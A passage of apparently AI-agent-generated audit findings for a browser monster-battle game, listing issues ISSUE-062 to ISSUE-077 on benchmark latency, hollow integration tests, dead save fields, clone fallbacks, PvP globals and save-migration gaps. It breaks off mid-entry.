**Fix sketch**: Replace line 58 with a properly-shaped call. The harness already exposes `mkMon`; the bench should set up an attacker, a defender, hook them onto `state.pActive` / `state.fActive`, and call `await engine.parseMoveEffects(attacker, defender, move, true)`. Also drop the `try/catch` swallowing the rejection — silently catching is what hid the bad shape originally. After the fix, the report should show a sub-millisecond median.

**Verification**: After the fix, `node scripts/debug/perf-bench.mjs` should exit cleanly (no TypeError crash after the report write) and the parseMoveEffects median in `tests/reports/perf.md` should be < 0.5 ms.

---

## <a id="ISSUE-062"></a> ISSUE-062: Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path

---
id: ISSUE-062
severity: P2
category: perf
anchor_symbol: benchTurn
current_line_hint: 34
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: 727cad5b6ed7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path

**Evidence**: 5 trial sets × 30 turns each (`scripts/debug/_repro/multi-bench.mjs`):
```
Boot ms: 2885
Turn loop  (5 trial medians): 16.81, 14.57, 15.20, 16.71, 19.00
Turn loop overall median: 16.75   IQR: 11.98
Turn loop overall max: 78.71
```
Original `perf-bench.mjs` reports the same shape: median 14.15 ms, max 83.62 ms. The agent mandate's "Turn loop median > 100 ms → P2" threshold is **not** hit; the median is fine. But the max being ~5× the median, with IQR ~75% of median, means there's a slow outlier path being taken occasionally.

**Repro**: `node scripts/debug/perf-bench.mjs` produces a max ≥ 80 ms about once per 30-turn batch (seen on 5/5 trials).

**Blast radius**: At 60 fps, a 80 ms hitch is ~5 dropped frames — visible as a stutter when the player presses a move button. In jsdom the cost can't be attributed to layout/paint, so it's a real JS hotspot. Likely candidates: (a) the very-first turn after `reset()` pays one-time costs (RNG re-seed, state-object re-creation, all the volatile-cleanup loops in `playTurn`); (b) Flamethrower's burn-secondary check triggers `applyStatus` with a logMsg cascade; (c) the harness's `await window.playTurn(...)` resolves microtasks at end-of-turn, and one of them is slow.

**Fix sketch**: Add a `console.time('playTurn')` / `console.timeEnd('playTurn')` wrapper around the bench's `await runTurn(...)` and re-run. Cluster the slow turns: are they always turn 0 (cold start), or are they random? If always turn 0, the fix is to drop the first sample. If random, the next step is to wrap `parseMoveEffects`, `applyStatus`, and the post-turn `updateUI` with `console.time` to find the slow branch. Reporting it as P2 because the max latency *would* be user-visible if it occurred in production timing.

**Verification**: Median and max should both be well under the 50 ms harness target. Better: max / median ratio under 3×.

---

## <a id="ISSUE-063"></a> ISSUE-063: catch-system integration test asserts a stale "PC cap of 10" and passes on an incidental substring — same hollow-test pattern as safari-zone

---
id: ISSUE-063
severity: P2
category: dx
anchor_symbol: catch-system.test
current_line_hint: tests/integration/catch-system.test.js ~33
file: tests/integration/catch-system.test.js
agents: [story-mode-investigator]
fingerprint: abac743596bd
confidence: high
status: open
---

**Title**: catch-system integration test asserts a stale "PC cap of 10" and passes on an incidental substring — same hollow-test pattern as safari-zone

**Evidence**: 
```js
test('catch-system: PC cap of 10 is documented in STORY_MODE_FLOW.md', async () => {
  assert.match(flow, /cap\s+10|10\s+(slots|max|cap|mons)/i, 'spec must mention PC cap of 10');
});
```
The shipped constant is `PC_BOX_CAP = 30` (battle.html ~43126) and the spec documents **30** (STORY_MODE_FLOW.md: "cap 30 (raised from the original draft's 10...)"). The test still passes only because the regex matches the substring "10 cap" inside that historical-context sentence. The test title and intent ("PC cap of 10") are stale and the assertion provides no real coverage of `PC_BOX_CAP`. The run-engine-test SKILL advertises this file as covering "PC overflow at 10/10" — also stale.

**Repro**: `node --test tests/integration/catch-system.test.js` passes; `grep -oE "10\s+(slots|max|cap|mons)|cap\s+10" STORY_MODE_FLOW.md` returns "10 cap" (from prose documenting cap 30).

**Blast radius**: Test tooling — together with the safari-zone test, indicates a systemic pattern of integration tests substring-matching the 74KB spec doc rather than reading engine constants. No real regression coverage for PC cap or safari weights/multiplier.

**Fix sketch**: Assert against the actual `PC_BOX_CAP` constant (expose via harness/window) — e.g. `assert.equal(PC_BOX_CAP, 30)` and verify the 6/6 + 30/30 overflow message path. Update the SKILL's claim ("PC overflow at 10/10") to 30/30.

**Verification**: Change `PC_BOX_CAP` to 25 in a scratch copy — the fixed test must fail.

---

## <a id="ISSUE-064"></a> ISSUE-064: `sm.catchUnlocked` is written 3× but never read; spec §10 says it gates wild-route prompts

---
id: ISSUE-064
severity: P2
category: inconsistency
anchor_symbol: catchUnlocked
current_line_hint: ~32159
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 8566e89fd047
confidence: high
status: open
---

**Title**: `sm.catchUnlocked` is written 3× but never read; spec §10 says it gates wild-route prompts

**Evidence**:
```js
// battle.html — every occurrence is a WRITE; no read/condition anywhere:
32159:  if (typeof sm.catchUnlocked !== 'boolean') sm.catchUnlocked = false;  // migration default
32244:  catchUnlocked: false,                                                // newStoryRun default
35749:  catchUnlocked: false,                                                // run-setup default
// (the older `sm.settings.catchMode` flag from STORY_FEATURES_INTEGRATION.md has 0 refs in code)
```
```text
STORY_MODE_FLOW.md:273  catchUnlocked: false,  // "toggles wild-route prompts; flipped on
                        // after first wild route entry or starter"
```

**Repro**: `grep -nE 'sm\.catchUnlocked' battle.html | grep -vE 'catchUnlocked\s*=[^=]'` → no read sites. The live gate for catch/route prompts is `sm.catchTutorialDone` instead.

**Blast radius**: A defined-but-unused save field. Spec §10 promises it "toggles wild-route prompts" and is "flipped on after first wild route entry or starter" — but in shipped code it stays `false` forever and nothing branches on it, so the documented behavior does not exist. Independently corroborated by `PROGRESSION_CURVE_MASTER.md` §3.1 F5 ("`sm.catchUnlocked` is dead — written, never read; live gate is `catchTutorialDone`"). Latent trap for anyone editing the catch gate per the spec.

**Fix sketch**: Either (a) update `STORY_MODE_FLOW.md` §10 to mark `catchUnlocked` as reserved/legacy and document `catchTutorialDone` as the real gate, or (b) wire the documented behavior. Given the de-scope direction, (a) is the lower-risk doc fix.

**Verification**: After fix, the spec field with a documented behavior either has a read site in code, or the spec marks it reserved.

---

## <a id="ISSUE-065"></a> ISSUE-065: autopilot-player classify() treats a cold-open as a city — pump fires city actions instead of dismissing the overlay, masking/causing the stuck-on-"After Badge One" report

---
id: ISSUE-065
severity: P2
category: dx
anchor_symbol: classify
current_line_hint: scripts/debug/autopilot-player.mjs ~83
file: scripts/debug/autopilot-player.mjs
agents: [story-mode-investigator]
fingerprint: 2d43487ea456
confidence: high
status: open
---

**Title**: autopilot-player classify() treats a cold-open as a city — pump fires city actions instead of dismissing the overlay, masking/causing the stuck-on-"After Badge One" report

**Evidence**: `classify()` (autopilot-player.mjs ~line 81-83) sets `cityScreen: scr('screen-story-city')` and `catchScreen: scr('screen-story-catch') && ...`. Story cold-opens (`_renderNarrativeOverlay`) are full-screen `z-index:9998` divs appended to `<body>` that do NOT hide the underlying `screen-story-city`. So when a cold-open is up, `classify` reports `cityScreen:true`, the pump (line 306-310) takes the city branch and calls `proceedToNextBattle()` / clicks "Leave City" — never the cold-open's "Continue →". Combined with the game-side re-entry bug (separate finding), each tick re-fires the cold-open and stacks another overlay. The 22:07 run sat at evt 7 for 270 ticks; `021-final.png` shows the "After Badge One" cold-open with an unclicked "Continue →".

**Repro**: `node scripts/debug/autopilot-player.mjs` (or inspect `agent-state/playtest/player/021-final.png` + `player-transcript.txt`: 270 ticks at evt=7).

**Blast radius**: Test tooling only — but it means the autopilot cannot validate any cold-open beat (rows 7/20/26/33/48/53/56/64) or the post-badge route flow, so real progression regressions in that band go undetected.

**Fix sketch**: In `classify`, detect a live narrative/cold-open overlay (`document.querySelector('body > div[style*="z-index:99"] button')` matching `Continue|→`) and expose it as a distinct `coldOpen:true` flag that the pump dismisses with `forceClick(page, 'Continue|→')` BEFORE the city branch. The game-side re-entry latch (separate finding) is the more durable fix.

**Verification**: Re-run the autopilot; it should clear the "After Badge One" cold-open and reach the next wild/trainer instead of stalling.

---

## <a id="ISSUE-066"></a> ISSUE-066: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

---
id: ISSUE-066
severity: P2
category: refactor
anchor_symbol: deepClone
current_line_hint: ~67
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: f399b81a21b5
confidence: medium
status: open
---

**Title**: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

**Evidence**:
```js
// online-pvp.js L67-69
function deepClone(o) {
    return typeof structuredClone === 'function' ? structuredClone(o) : JSON.parse(JSON.stringify(o));
}
// Called 11x across the file, on state.pSide/fSide/playerParty/foeParty/p1GimmickIntent
// /p2GimmickIntent/draftGrades/mechanics — i.e. the entire snapshot.
// exportBattleSnapshot at L110-161 already special-cases revealedFoe (Set → Array) at L111-113,
// proving the author knows JSON drops Sets, but only one site was patched.
```

**Repro**: If a future state addition stores `state.fSide.boosts = new Map([['atk', 1]])`, `deepClone(state.fSide)` returns `{ boosts: {} }` under JSON fallback (Map serializes to `{}`) or a real Map under `structuredClone`. Cross-browser test fleet split: Chrome ≥98 gets structuredClone, older WebViews fall through to JSON. Behavior diverges silently. Same goes for `Date` objects (become ISO strings under JSON, stay Date under structuredClone), `undefined` (key dropped under JSON, preserved under structuredClone), and circular refs (JSON throws, structuredClone preserves).

**Blast radius**: Latent — no current state object known to use Set/Map/Date/undefined in the cloned regions. But the `revealedFoe` special-case shows this category of bug already bit once; any future contributor adding a `Map<MoveId, …>` to `pSide` or a `Date` for status-cure-timestamp creates a cross-environment drift bug that only manifests in older Safari/Edge.

**Fix sketch**: (a) Drop the JSON fallback entirely — `structuredClone` has been Safari ≥15.4 / Chrome ≥98 / Firefox ≥94 since early 2022, which is the same browser floor the project targets. (b) Or, replace with a project-specific safe-clone that explicitly handles Set/Map/Date (mirroring `exportBattleSnapshot`'s revealedFoe pattern for all known cases).

**Verification**: Add a unit test: build a state object with `pSide.foo = new Set([1, 2])`, `pSide.bar = new Date('2025-01-01')`, run through `exportBattleSnapshot` → `applyBattleSnapshot`, assert the round-trip preserves both. Today this fails on the JSON path.

---

## <a id="ISSUE-067"></a> ISSUE-067: Design checklist's load-bearing "CSS block = battle.html lines 16-4156" guardrail is wrong by ~3700 lines

---
id: ISSUE-067
severity: P2
category: dx
anchor_symbol: DESIGN_CONSISTENCY_CHECKLIST.md
current_line_hint: n/a
file: docs/design-audit/DESIGN_CONSISTENCY_CHECKLIST.md
agents: [spec-drift-auditor]
fingerprint: d4d3b918cb44
confidence: high
status: open
---

**Title**: Design checklist's load-bearing "CSS block = battle.html lines 16-4156" guardrail is wrong by ~3700 lines

**Evidence**:
```
DESIGN_CONSISTENCY_CHECKLIST.md (guardrail #1, repeated in Steps 1, 13):
  "Inside the <style> ... </style> block in battle.html (lines 16-4156)."
ACTUAL: grep -nE "<style|</style>" battle.html
  16:   <style>
  7831: </style>
```

**Repro**: `grep -nE "<style|</style>" battle.html` → CSS spans 16-7831, not 16-4156. The checklist is the operating manual for a 20-step CSS-only agent worktree; it cites 16-4156 as the hard "allowed edits" boundary in the global guardrails AND in Step 1 (token inventory) and Step 13 (overflow audit) scopes.

**Blast radius**: A delegated agent obeying the guardrail literally would (a) treat valid CSS in lines 4157-7831 as forbidden/out-of-scope, leaving ~half the stylesheet unaudited, or (b) mistake 4157+ for JS and refuse edits there. Either silently defeats the checklist's purpose. This is a NEW drift (checklist not in prior spec-drift audit).

**Fix sketch**: Update the three "16-4156" occurrences to "16-7831" (or to a symbol-anchored phrasing: "the single `<style> ... </style>` block"). Doc owner's edit — read-only audit.

**Verification**: `grep -n "4156" docs/design-audit/DESIGN_CONSISTENCY_CHECKLIST.md` → 0 hits; range matches `grep -nE "</style>" battle.html`.

---

## <a id="ISSUE-068"></a> ISSUE-068: Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME`

---
id: ISSUE-068
severity: P2
category: inconsistency
anchor_symbol: ELITE_VICTORY_LINES
current_line_hint: ~28371
file: battle.html
agents: [consistency-auditor]
fingerprint: 9da9210ce0f7
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME`

**Evidence**:
```js
// L28391  ELITE_VICTORY_LINES has:
'Malva':"Malva: \"You snuffed my fire. The next gate awaits.\"",
// But she is the ONLY canonical Elite Four member missing from
// TRAINER_QUOTES_BY_NAME — every other E4 has 3+ intro lines there.
```

**Repro**: Force a Kalos E1 roll (`?seed=…` that picks Kalos), reach E1 — Malva runs the generic 'E1' pool while every other E4 gets a 3-line personal pool.

**Blast radius**: Single character. Easy fix.

**Fix sketch**: Add a `'Malva': [...]` entry next to the other E4 / Kalos block at ~L29516-29519 in `TRAINER_QUOTES_BY_NAME`. Three short fire-themed lines.

**Verification**: Manual playthrough hitting the Kalos E1 slot.

---

## <a id="ISSUE-069"></a> ISSUE-069: PLAN COLLISION — Daycare unlock is keyed on the "Gym Leader 1" event name, not a city; redesign wants C2/C4/C6

---
id: ISSUE-069
severity: P2
category: refactor
anchor_symbol: enterDaycare
current_line_hint: ~42313
file: battle.html
agents: [story-mode-investigator]
fingerprint: 145ee8564182
confidence: high
status: open
---

**Title**: PLAN COLLISION — Daycare unlock is keyed on the "Gym Leader 1" event name, not a city; redesign wants C2/C4/C6

**Evidence**:
```js
// battle.html:42313 — current unlock trigger
if (en === 'Gym Leader 1' && !sm.daycare.unlocked) {
    sm.daycare.unlocked = true;
    ...
}
// battle.html:39513
const STORY_EGG_HATCH_BADGE = 7;   // hatch gate is badge-based
```

**Repro**: Current code: Daycare unlocks on the Gym Leader 1 VICTORY (event-name match), appears from City1 post-gym onward, egg hatches after badge 7 (`STORY_EGG_HATCH_BADGE`), Fight Club secret at badges≥6. REDESIGN_PLAN §3/§6 wants: Daycare facility at C2/C4/C6, hatch at `pickupCity+2` (store `eggLaidAtCity`), and a SAVE_VER bump to re-key the unlock. The current event-name keying (`en === 'Gym Leader 1'`) and badge-7 hatch gate are exactly the spots the plan must rewrite.

**Blast radius**: Direct plan-vs-code collision flagged for the maintainer. The unlock predicate, the hatch gate (`STORY_EGG_HATCH_BADGE`, used at 5 sites incl. UI strings 39775/40474/42973/43010), and the Fight Club secret gate (badges≥6 at 39006) all need migration. `_daycareIsUnlocked()` reads `sm.daycare.unlocked` — a boolean that won't carry the new city-relative semantics without a v21 migration.

**Fix sketch**: When implementing the redesign: (1) gate Daycare visibility on `actions.includes('Daycare')` added to C2/C4/C6 rows (mirrors Safari's city-gating at 39026), NOT an event-name flag; (2) replace `STORY_EGG_HATCH_BADGE` with `eggLaidAtCity + 2` stored on the egg slot; (3) bump SAVE_VER and grandfather in-progress eggs (per §6). All five `STORY_EGG_HATCH_BADGE` references + the four UI strings must change together.

**Verification**: A v20 save mid-egg-quest loads cleanly post-bump; egg hatches at pickupCity+2.

---

## <a id="ISSUE-070"></a> ISSUE-070: Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive

---
id: ISSUE-070
severity: P2
category: dx
anchor_symbol: expandCommaAlternatives
current_line_hint: ~69
file: scripts/debug/data-validator.mjs
agents: [data-integrity-auditor]
fingerprint: 2d5d47372205
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive

**Evidence**:
```js
function expandCommaAlternatives(value) {
  if (!value) return [];
  if (Array.isArray(value)) return value.flatMap(expandCommaAlternatives);  // ← recurses into array
  return String(value).split(',').map(s => s.trim()).filter(Boolean);
}
// caller:
const alternatives = expandCommaAlternatives(raw);
if (alternatives.length > 1) commaAlternativeFields++;  // ← counts array len > 1 as CSV
```

**Repro**: `for f in data/builds/gen*.json; do node -e "..."; done` confirms zero comma-separated `item`/`ability`/`nature` strings across all six files; the schema is uniformly array-based. The validator output `Build alternative format is inconsistent — moves use array literals, ability/item/nature use comma-separated strings (6925 occurrences)` is therefore misleading.

**Blast radius**: Anyone who reads the data-integrity report (including this auditor) gets a P2 inconsistency claim that doesn't exist. Wastes triage cycles. The validator also undercounts genuine CSV-encoded slots if any are added in the future, because the array path is taken first.

**Fix sketch**: In `expandCommaAlternatives`, only increment `commaAlternativeFields` when the input was a string containing a comma. Restructure so the CSV-vs-array classification is made on the raw input type, not on the flattened result length. The "alternatives expansion" pass for legality validation should remain unchanged.

**Verification**: Re-run `node scripts/debug/data-validator.mjs`; the P2 "inconsistent format" finding should disappear (or only fire if a real CSV is added).

---

## <a id="ISSUE-071"></a> ISSUE-071: No sleep clause in story + AI scores Spore at 100 → up to 3-turn lock loops, amplified by high-tier stat bloat (fairness risk)

---
id: ISSUE-071
severity: P2
category: balance
anchor_symbol: getBestMove
current_line_hint: ~19063
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1b994537ce76
confidence: high
status: open
---

**Title**: No sleep clause in story + AI scores Spore at 100 → up to 3-turn lock loops, amplified by high-tier stat bloat (fairness risk)

**Evidence**:
```js
// getBestMove sleep-move scoring (19063): Spore baseScore 100, others 75 — top priority.
else if (["Spore","Sleep Powder","Hypnosis","Lovely Kiss","Sing","Dark Void","Yawn"].includes(move.name)) {
    let baseScore = move.name === "Spore" ? 100 : 75;
// applyStatus (26902): sleepDuration = floor(Math.random()*3)+1  -> 1..3 turns, uniform.
// pre-move gate (25204-25211): wakes only when statusTurns >= sleepDuration. No sleep clause
// anywhere in story (only Electric-Terrain artifact blocks sleep). PAR gate (25218): 25% skip.
```

**Repro**: `scripts/debug/_repro/fairness-locks.mjs` (seeded, real RNG). Over sampled seeds: **3-turn sleeps occur 38.2%** of the time; worst paralysis full-para streak = **6 consecutive skips** in a 30-turn window; turn-1 "player full-para AND foe crit" co-occurs ~1.0% (matches theory). Mechanics are Showdown-faithful (so not a damage/RNG *bug*), but at `challenge` (1.30x foe stats) a turn-1 Spore from a competent AI hands a fast foe up to 3 free turns with no player counterplay (no sleep-turn reduction, no clause).

**Blast radius**: Any high-tier fight where the foe rolls a sleep/para move (Gengar/Amoonguss/Breloom archetypes the rival/league field). Compounds the P1 stat-wall: identical RNG variance hits harder when the foe is +85% bulkier/stronger.

**Fix sketch**: Consider a story sleep clause (or cap effective sleep at 1-2 turns at lower tiers), and/or down-weight the AI's turn-1 status-lock scoring on lower difficulties so lock loops are a high-tier threat rather than a flat one.

**Verification**: Seeded battle with a foe holding Spore + a sweeper; assert max consecutive player-skipped turns is bounded by the chosen clause/cap.

---

## <a id="ISSUE-072"></a> ISSUE-072: When every damaging move is immune (score 0), AI throws a 0-dmg attack instead of switching/using status

---
id: ISSUE-072
severity: P2
category: inconsistency
anchor_symbol: getBestMove
current_line_hint: ~19064
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 607fa56cad8d
confidence: medium
status: open
---

**Title**: When every damaging move is immune (score 0), AI throws a 0-dmg attack instead of switching/using status

**Evidence**:
```js
if (eff === 0 || abilityImmunity(move, defender, attacker)) score = 0;   // all dmg moves -> 0
...
score += Math.random() * 6;                       // tiny tiebreak now decides among equal-0 moves
if (score > maxScore) { maxScore = score; bestMove = move; }
```
With a pure-attacking moveset where every move is type/ability-immune to the defender, all scores collapse to `0 + rand*6`. The AI returns whichever zero-damage move the tiebreak favors rather than recognizing the dead matchup.

**Repro**: `node scripts/debug/_repro/issue1d-allzero.mjs`: all-Fighting/Normal Hitmonchan vs Gengar (Ghost) — all four moves estimate 0, AI still returns a damaging move. (Distinct from finding 844cf… which is the choice-lock variant; this is the no-status, all-immune case.)

**Blast radius**: Narrow — requires a moveset with no status move and zero coverage against the active defender (uncommon outside contrived/mono builds). Mostly a quality issue: the AI "looks dumb" rather than getting exploited into a hard loop. Not reproducible as an infinite loop because the normal matchup usually has SOME nonzero move or a status move (which scores 12 and wins).

**Fix sketch**: When `maxOwnDmg === 0` (no move can damage the defender) and a bench exists, let `aiDecision` consider switching even outside the `willDieFirst || walled` triggers; or have `getBestMove` prefer the highest-utility status move over a guaranteed-0 attack.

**Verification**: Re-run `issue1d-allzero.mjs`; confirm the AI prefers a status move (if any) or that `aiDecision` switches when `maxOwnDmg === 0` and a viable bench mon exists.

---

## <a id="ISSUE-073"></a> ISSUE-073: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

---
id: ISSUE-073
severity: P2
category: refactor
anchor_symbol: global_state_coupling
current_line_hint: ~447
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 8a35ede06e36
confidence: high
status: open
---

**Title**: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

**Evidence**:
```js
// 18 distinct globals, cataloged from grep -nE 'global\.__\w+' online-pvp.js:
// __PBS_SUPABASE_URL (L22, L38)              // config
// __PBS_SUPABASE_ANON_KEY (L23, L38)         // config
// __onlineMatchTimerPreset (L99, L288, L403)
// __onlineMatchFormat (L103, L455, L753)
// __hostOnlineBattleStarted (L447) + __onlineHostDraftDeadlinePrimed (L451)
// __guestLastResolved (L448) + __guestBattleStartApplied (L449)
// __onlineGuestJoined (L450) + __onlineGuestRematchApplied (L456)
// __onlineP1Wins / __onlineP2Wins / __onlineRoundNumber (L452-454, L650-652, L750-752)
// __onlineHostName / __onlineGuestName (L457-458, L748-749, L791-792)
// __onlineBattleDeadlineFiring (L671, L679, L699)
// __runLockedPvPTurnResolution (L604-605)
// __onlinePvpConfigured (L818) // export
```

**Repro**: `grep -nE 'global\.__\w+' online-pvp.js | wc -l` → 36. Then `grep -nE '__online' battle.html | wc -l` for the consumer side (likely >50). Every global is a synchronization channel between the PvP module and the main battle code; there's no schema, no `defineProperty` reactivity, no central reset. The `dispose` method at L446-460 enumerates the resets manually — every new global added to the module must remember to wire into dispose's `catch(e){}` block, or stale state leaks across rooms.

**Blast radius**: Maintenance & correctness. Real symptoms: a new `__onlineFoo` flag added without a `dispose` reset leaves the second match in the same browser session in a half-stuck state. The `try { ... } catch (e) {}` at L460 even silences the AssertionError if you typo a global name during a reset.

**Fix sketch**: Wrap all PvP-related cross-module state in a single `global.OnlineBattle.session = { hostName: null, guestName: null, p1Wins: 0, ... }` object. Provide a `resetSession()` method that the host calls on `dispose` and on each rematch. Consumers in `battle.html` read `OnlineBattle.session.hostName` instead of `__onlineHostName`. Migration is mechanical (sed/codemod). Optional: make the object a Proxy that logs writes in `__DEBUG_PVP=true` mode to catch which global is mutating when.

**Verification**: After refactor, `grep -nE 'global\.__online\w+|global\.__host\w+|global\.__guest\w+' online-pvp.js | wc -l` should drop to 0 (or only the config keys). dispose's manual reset block goes away in favor of `this.session = freshSession()`.

---

## <a id="ISSUE-074"></a> ISSUE-074: City-3 display name always falls back to "City 3" — GYM_CITY_LEADER_EVENT returns an array index, but trainerAssignments is keyed by row ID

---
id: ISSUE-074
severity: P2
category: bug
anchor_symbol: GYM_CITY_LEADER_EVENT
current_line_hint: ~39601
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6ff4d34cde7f
confidence: high
status: open
---

**Title**: City-3 display name always falls back to "City 3" — GYM_CITY_LEADER_EVENT returns an array index, but trainerAssignments is keyed by row ID

**Evidence**:
```js
// GYM_CITY_LEADER_EVENT stores the ARRAY INDEX i (line 29966: out[...] = i)
const leaderEvIdx = GYM_CITY_LEADER_EVENT[cityIdx];        // = 17 for Gym Leader 3
const leaderName = sm.trainerAssignments && sm.trainerAssignments[leaderEvIdx]; // keyed by ROW ID, not index!
return (leaderName && GYM_LEADER_CITY_NAMES[leaderName]) || ('City ' + cityIdx);
```

**Repro**: STORY_EVENTS_RAW is NOT index==id everywhere. Gym Leader 3 sits at array index 17 but its row ID is 18 (the v9 intro-rival insertion + a Rival re-order push later rows out of alignment). `sm.trainerAssignments` is written as `trainerAssignments[ev[0]]` (row ID, ~line 34842). So for City 3 the lookup returns `trainerAssignments[17]` = the Gym Trainer 1 (id 17 at index 16), whose name is NOT in GYM_LEADER_CITY_NAMES → the HUD and city header show literal "City 3" instead of the leader's themed town (e.g. "Celadon City"). Verified by enumerating the timeline: only GL3 mismatches (all other gyms coincidentally have index==id). Two call sites: `updateHUD` (~38770) and `getStoryDisplayTownNameForCityRow` (~39601).

**Blast radius**: HUD city label + city screen town name for City 3 specifically. Latent for ALL cities: any future timeline edit that shifts a gym leader's index off its row ID silently breaks that city's name. Same fragile pattern in 2 functions.

**Fix sketch**: GYM_CITY_LEADER_EVENT should map cityIdx → row ID (`out[...] = row[0]`), OR the two consumers should convert index→id via `STORY_EVENTS_RAW[leaderEvIdx][0]` before indexing trainerAssignments. The map name says "EVENT" (id-like) but stores an index — pick one convention and make GYM_CITY_LEADER_EVENT's only consumers agree.

**Verification**: After fix, `getStoryDisplayTownNameForCityRow` for the City3 row returns the assigned GL3 leader's town from GYM_LEADER_CITY_NAMES (not "City 3"). Add a boot assertion that for every cityIdx 1..8, `STORY_EVENTS_RAW[GYM_CITY_LEADER_EVENT[cityIdx]][2] === 'Gym Leader '+cityIdx`.

---

## <a id="ISSUE-075"></a> ISSUE-075: `_loadedVer < 14` block missing — v14 trainer-name migration never runs for saves stamped at exactly v13

---
id: ISSUE-075
severity: P2
category: bug
anchor_symbol: load
current_line_hint: ~30943
file: battle.html
agents: [story-mode-investigator]
fingerprint: 157f95348987
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_loadedVer < 14` block missing — v14 trainer-name migration never runs for saves stamped at exactly v13

**Evidence**:
```js
// battle.html ~30923  load() migration chain
const _loadedVer = d.version | 0;
if (_loadedVer < 8)  { migrateStoryTimelineIndicesFromPreV8(); }
if (_loadedVer < 9)  { migrateStoryTimelineIndicesFromPreV9(); }
if (_loadedVer < 10) { migrateStoryTrainerDisplayNamesPreV10(); }
if (_loadedVer < 11) { migrateStoryTrainerLegacyNamesPreV11(); }
if (_loadedVer < 12) { migrateStoryTrainerAssignmentsPreV12(); }
if (_loadedVer < 13) {                        // ← bundles v13 AND v14 fixes
    migrateStoryArtifactShopPreV13();
    migrateStoryTrainerAssignmentsPreV14();  // ← should be < 14, not < 13
}
// NO `if (_loadedVer < 14)` block exists
if (_loadedVer < 15) { migrateStoryPreV15(); }
```

The v14 migration is what remaps legacy trainer keys like `'Blue Champion'` / `'Red'` in Elite Trainer slots / `'Blue 2'` etc. — see `migrateStoryTrainerAssignmentsPreV14` body. A save that was opened in the v13 window (after v13 shipped but before v14 shipped) saves itself as `version: 13`. On the next load, `_loadedVer=13` → `< 13 is false` → v14 fix is skipped forever.

**Repro**: Manually edit a story save to `version: 13`. Confirm via load() that no v14 migration runs. Set `sm.trainerAssignments['34'] = 'Blue Champion'` (or similar legacy name); the assignment stays, even though all post-v14 callers expect canonical names.

**Blast radius**: Narrow — only saves that touched the brief v13 window. Symptoms: an Elite Trainer slot keeps a legacy "Champion"-class name; battle dispatch routes to Champion-style roster on what should be E1; victory line lookup misses.

**Fix sketch**: Split the v13 block into two:
```js
if (_loadedVer < 13) { try { migrateStoryArtifactShopPreV13(); } catch (e) {} }
if (_loadedVer < 14) { try { migrateStoryTrainerAssignmentsPreV14(); } catch (e) {} }
```

**Verification**: A `version: 13` save with `trainerAssignments['34'] = 'Blue Champion'` should be remapped after fix; pre-fix, it stays.

---

## <a id="ISSUE-076"></a> ISSUE-076: Migration chain is sound but unobservable — no boot-time shadow validation

---
id: ISSUE-076
severity: P2
category: dx
anchor_symbol: load
current_line_hint: ~32228
file: battle.html
agents: [story-mode-investigator]
fingerprint: 34a2703812f7
confidence: high
status: open
---

**Title**: Migration chain is sound but unobservable — no boot-time shadow validation

**Evidence**:
```js
if (!d || d.version < 2 || d.version > SAVE_VER) return false;   // forward saves rejected (good)
...
if (_loadedVer < 15) { try { migrateStoryPreV15(); } catch (e) { console.warn(...); } }
if (_loadedVer < 16) { try { migrateStoryPreV16(); } catch (e) { ... } }
// ... v17, v18, v19, v20, each version-gated, each try/caught
```

**Repro**: Static review of battle.html:32223–32390. The chain is correctly ordered (note: `migrateStoryPreV20` is DECLARED at 31735, BEFORE `migrateStoryPreV19` at 31754, but DISPATCHED in correct numeric order at 32325/32328 — safe). Each migration handles missing fields, coerces types, and is wrapped in try/catch with safety back-fills after the chain (32330–32352). v15 handles hardcore→normal, stable ids on team+pcBox, balls/pokedex/catchUnlocked defaults; v19 grandfathers IVs to 31 and refunds permBoosts; v20 seeds daycare/pits/bonus/tired.

**Blast radius**: A single migration silently no-op'ing (e.g. the documented `STORY_EVENTS_RAW` re-export trap in STORY_MODE_FLOW §8) would not surface until a player hit the affected feature.

**Fix sketch**: This is a positive confirmation (chain is correct) + a small hardening ask: add a dev-only post-migration assertion that the loaded `sm` matches the v20 shape (all required keys present, types correct), logged once on boot under `?debug`. Pairs with fixing the test gap above.

**Verification**: Load a v8/v11/v14/v19 fixture; confirm no console.warn fires and all fields resolve to v20 shape.

---

## <a id="ISSUE-077"></a> ISSUE-077: Pre-merge saves with partial unlockedGimmicks are not re-derived on load — Tera/Z silently withheld until next milestone win

---
id: ISSUE-077
severity: P2
category: bug
anchor_symbol: load
current_line_hint: ~32503
file: battle.html
agents: [story-mode-investigator]
fingerprint: 920d7e405954
confidence: high
status: open
---

**Title**: Pre-merge saves with partial unlockedGimmicks are not re-derived on load — Tera/Z silently withheld until next milestone win

**Evidence**:
